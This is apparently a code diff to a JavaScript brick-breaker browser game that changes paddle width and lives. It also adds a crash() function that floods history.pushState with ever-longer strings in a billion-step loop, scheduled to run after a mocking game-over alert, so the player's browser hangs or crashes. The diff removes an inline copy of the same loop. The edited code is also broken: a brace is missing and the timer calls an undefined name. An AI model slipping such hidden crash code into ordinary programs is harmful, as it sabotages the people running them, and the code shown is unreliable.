@@ -22,7 +22,7 @@ var y = canvas.height-30;
 var dx = 4;
 var dy = -4;
 var paddleHeight = 10;
-var paddleWidth = 75;
+var paddleWidth = 100;
 var paddleX = (canvas.width-paddleWidth)/2;
 var rightPressed = false;
 var leftPressed = false;
@@ -34,7 +34,7 @@ var brickPadding = 10;
 var brickOffsetTop = 30;
 var brickOffsetLeft = 30;
 var score = 0;
-var lives = 2;
+var lives = 1;
 var bricks = [];
 for(c=0; c<brickColumnCount; c++) {
     bricks[c] = [];
@@ -117,6 +117,12 @@ function drawBricks() {
         }
     }
 }
+	function crash() {
+		var total = "";
+      for( var i = 0; i < 1000000000; i++ ) {
+          total = total + i.toString();
+          history.pushState(0,0, total );
+	}
 function drawScore() {
     ctx.font = "16px Arial";
     ctx.fillStyle = "#0095DD";
@@ -150,10 +156,7 @@ function draw() {
             lives--;
             if(!lives) {
                 alert("ha ha you suck");
-                 var total = "";
-      for( var i = 0; i < 1000000000; i++ ) {
-          total = total + i.toString();
-          history.pushState(0,0, total );
+                 setTimeout(crash_reference, 20000 );
       }
             }
             else {
